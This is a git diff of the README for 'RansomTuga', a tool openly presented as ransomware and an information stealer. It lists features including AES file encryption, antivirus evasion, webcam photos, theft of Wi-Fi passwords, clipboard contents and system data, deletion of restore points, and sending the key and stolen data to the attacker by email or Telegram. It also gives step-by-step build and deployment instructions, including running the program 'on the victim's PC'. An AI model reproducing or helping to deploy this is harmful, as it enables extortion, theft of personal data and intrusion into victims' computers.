@@ -6,13 +6,11 @@
 </p>
 <img src=".github/images/main.jpg" alt="logo">
 
-This project, RansomTuga, is an advanced ransomware and semi-stealer with many customizable options.
-The main goal of the project is to achieve a self-contained solution by providing a single .exe file for encryption and another distinct .exe file for decryption, both of which require no external dependencies.
-It uses anti-dumping functions to evade detection by some anti-viruses.
-It encrypts files using AES CBC encryption with a randomly generated 256-bit key and 128-bit IV.
-The program has a whitelist and blacklist for the extensions of files it will encrypt.
-Additionally, it takes photos from all connected webcams, sends the encryption key and some PC information to the attacker via email or Telegram, retrieves various information from the victim's PC, drops a readme.txt file and a decryptor, changes the victim's computer wallpaper, and can change the extension and set a custom icon for the encrypted files.
-It also has the capability to upload files to AnonFiles before encryption, and can delete the executable from which it was launched.
+The project called RansomTuga is an advanced ransomware and semi-stealer that offers numerous customizable options. Its main objective is to provide a self-contained solution, utilizing a single .exe file for encryption and another separate .exe file for decryption. These files do not require any external dependencies. The program employs anti-dumping functions to avoid detection by certain anti-virus software.\
+\
+For encryption, RansomTuga utilizes AES CBC encryption, employing a randomly generated 256-bit key and a 128-bit IV. The program includes a whitelist and blacklist feature for file extensions that will be subjected to encryption.\
+\
+Moreover, RansomTuga captures photos from all connected webcams, sending the encryption key, along with some PC information, to the attacker via email or Telegram. It also retrieves various information from the victim's PC, drops a readme.txt file and a decryptor, alters the victim's computer wallpaper, and can modify the file extension and apply a custom icon to the encrypted files. Additionally, it possesses the capability to upload files to AnonFiles prior to encryption and can delete the executable from which it was initially launched.
 
 
 # Table of Contents
@@ -26,45 +24,45 @@ It also has the capability to upload files to AnonFiles before encryption, and c
 
 
 # Features
-- Encryption of files using the **AES CBC 256** algorithm with a randomly generated key and 128-bit IV.
-- **Anti-dumping functions** to evade detection by some anti-viruses.
-- A **whitelist and blacklist** for file extensions to target or exclude during encryption.
-- **Taking photos** from all connected webcams.
-- **Stealing system information** such as the hardware ID (HWID), IP address, CPU and RAM specs, GPU brand, host name, username, screen resolution, screenshots, clipboard contents, and Wi-Fi passwords.
-- **Deleting restore points**
-- **Custom file icon** for encrypted files
-- **Changing the wallpaper**
-- **Uploading files** to a remote server before encryption
-- **Sending the encryption key and stolen information** to the attacker via email or Telegram bot.
-- **Self-deletion** of the malware executable after execution.
-- **Fully customizable** with over 60 different options.
-And many more!
+- File encryption is performed using the robust **AES CBC 256** algorithm, employing a randomly generated key and a 128-bit IV.
+- **Anti-dumping** functions are implemented to elude detection by certain anti-virus software.
+- The program incorporates a **whitelist** and **blacklist** feature, allowing for targeted or excluded file extensions during the encryption process.
+- RansomTuga has the capability to **capture photos** from all connected webcams.
+- It also steals various **system information**, including hardware ID (HWID), IP address, CPU and RAM specifications, GPU brand, screen resolution, screenshots, clipboard contents, GPS location and Wi-Fi passwords.
+- The malware can **delete restore points** on the system.
+- Encrypted files can be assigned a **custom file icon**.
+- The victim's **wallpaper** can be altered by the malware.
+- Before encryption, files can be **uploaded** to a remote server.
+- The **encryption key**, along with stolen information, can be **sent to the attacker** through email or a Telegram bot.
+- The malware has a **self-deletion** feature, removing its executable after execution.
+- With over 70 different options, RansomTuga is **highly customizable**.
+And many more features are available!
 
 
 # Compilation Instructions
-- Install latest version of Python 3 [here](https://www.python.org/downloads/)
-- Install latest version of Visual Studio 2022 [here](https://visualstudio.microsoft.com/downloads/)
-- Install latest version of Git [here](https://git-scm.com/download/win)
+- Install the latest version of Python 3 from [here](https://www.python.org/downloads/).
+- Install the latest version of Visual Studio 2022 from [here](https://visualstudio.microsoft.com/downloads/).
+- Install the latest version of Git from [here](https://git-scm.com/download/win).
 - Install vcpkg and CryptoPP using Git Bash:
-  - Open  Git Bash
-  - Run `git clone https://github.com/microsoft/vcpkg`
-  - Run `./vcpkg/bootstrap-vcpkg.bat`
-  - Run `./vcpkg/vcpkg.exe install cryptopp:x64-windows-static`
-  - Run `./vcpkg/vcpkg.exe install minhook:x64-windows-static`
-  - Run `./vcpkg/vcpkg.exe integrate install`
-- Download the project and extract it
-- Change in the first line of `./RansomTuga/preCompilation.bat` and `./RansomTuga/postCompilation.bat` the word `py` with whatever command you use to open python in command prompt
-- Open the project double clicking on `./RansomTuga.sln`
-- Customize everything you want in `./commons/common.h`, you **must** change `SENDERMAIL` `SENDERPSW` and `RECEIVERMAIL` in order to receive victim data
-- Compile the project in `Release` and `x64`
+  - Open Git Bash.
+  - Run the command `git clone https://github.com/microsoft/vcpkg`.
+  - Run the command `./vcpkg/bootstrap-vcpkg.bat`.
+  - Run the command `./vcpkg/vcpkg.exe install cryptopp:x64-windows-static`.
+  - Run the command `./vcpkg/vcpkg.exe install minhook:x64-windows-static`.
+  - Run the command `./vcpkg/vcpkg.exe integrate install`.
+- Download the project and extract it.
+- In the first line of `./RansomTuga/preCompilation.bat` and `./RansomTuga/postCompilation.bat`, replace the word `py` with the command you use to open Python in the command prompt.
+- Double click on `./RansomTuga.sln` to open the project.
+- Customize any desired settings in `./commons/common.h`. Make sure to change `SENDERMAIL`, `SENDERPSW`, and `RECEIVERMAIL` to receive victim data.
+- Compile the project in `Release` and `x64`.
 
 
 # Usage Instructions
-- Open `RansomTuga.exe` on the victim pc, if it is in debug mode it encrypts all files in `./debugFolder/` or in the path defined in arguments else in `C:/Users/`
-- Download the attachment from the received email
-- Open `InfoDecryptor.exe` and select the attachment just downloaded, it decrypts the crypted info-file
-- Open the decrypted file and copy the key
-- Open `DataDecryptor.exe` and paste the key, it decrypts all encrypted files
+- Open `RansomTuga.exe` on the victim's PC. If it is in debug mode, it will encrypt all files in `./debugFolder/` or in the path specified in the arguments; otherwise, it will encrypt files in the current directory.
+- Download the attachment from the received email or the received Telegram message.
+- Open `InfoDecryptor.exe` and select the downloaded attachment. It will decrypt the encrypted info-file.
+- Open the decrypted file and copy the key.
+- Open `DataDecryptor.exe` and paste the key. It will decrypt all encrypted files.
 
 
 # Todo list
